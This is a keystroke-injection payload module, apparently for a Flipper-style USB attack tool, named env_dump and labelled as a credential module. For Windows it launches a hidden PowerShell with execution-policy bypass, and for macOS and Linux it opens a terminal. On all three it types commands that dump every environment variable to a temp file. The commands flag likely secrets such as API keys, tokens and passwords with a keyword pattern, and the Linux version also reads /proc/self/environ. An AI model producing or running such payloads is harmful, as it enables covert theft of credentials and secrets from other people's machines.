# FlipperPwn Module: Environment Variable Dump
# Dumps all environment variables sorted alphabetically.
# High-value targets: API keys, tokens, cloud credentials (AWS_SECRET_ACCESS_KEY,
# GITHUB_TOKEN, DATABASE_URL, etc.), proxy settings, and internal service URLs.

NAME env_dump
DESCRIPTION Dump all environment variables — useful for finding API keys, tokens, and secrets
CATEGORY credential
PLATFORMS WIN,MAC,LINUX

# No options required

PLATFORM WIN
  # Open hidden PowerShell via Run dialog
  DELAY 500
  GUI r
  DELAY 300
  STRING powershell -w h -nop -ep bypass
  ENTER
  DELAY 1000
  # Get-ChildItem Env: gives key=value pairs; sort by name for readability
  # Also flag any likely secrets with a comment marker for easy grep
  STRING $o="$env:TEMP\env_dump.txt"; "=== ENVIRONMENT VARIABLE DUMP ===" | Out-File $o; Get-ChildItem Env: | Sort-Object Name | ForEach-Object { $line="$($_.Name)=$($_.Value)"; if($_.Name -match 'KEY|TOKEN|SECRET|PASSWORD|PASS|CREDENTIAL|API|AUTH|PWD|PRIVATE|ACCESS'){$line="[!HIT] $line"}; $line } | Out-File $o -Append; Start-Process notepad $o
  ENTER

PLATFORM MAC
  # Open Terminal via Spotlight
  DELAY 500
  GUI SPACE
  DELAY 400
  STRING Terminal
  ENTER
  DELAY 1200
  # env sorted; highlight likely secrets with grep (non-blocking — both views written)
  STRING o=/tmp/env_dump.txt; echo "=== ENVIRONMENT VARIABLE DUMP ===" > $o; env | sort >> $o; echo "=== LIKELY SECRETS (grep) ===" >> $o; env | grep -iE 'key|token|secret|password|credential|api|auth|private|access' >> $o 2>/dev/null; open -e $o
  ENTER

PLATFORM LINUX
  # Open terminal emulator
  DELAY 500
  CTRL ALT t
  DELAY 1000
  # Same as macOS; also check for /proc/1/environ (init process env, needs root)
  STRING o=/tmp/env_dump.txt; echo "=== ENVIRONMENT VARIABLE DUMP ===" > $o; env | sort >> $o; echo "=== LIKELY SECRETS (grep) ===" >> $o; env | grep -iE 'key|token|secret|password|credential|api|auth|private|access' >> $o 2>/dev/null; echo "=== /proc/self/environ ===" >> $o; tr '\0' '\n' < /proc/self/environ >> $o 2>/dev/null; xdg-open $o 2>/dev/null || cat $o
  ENTER
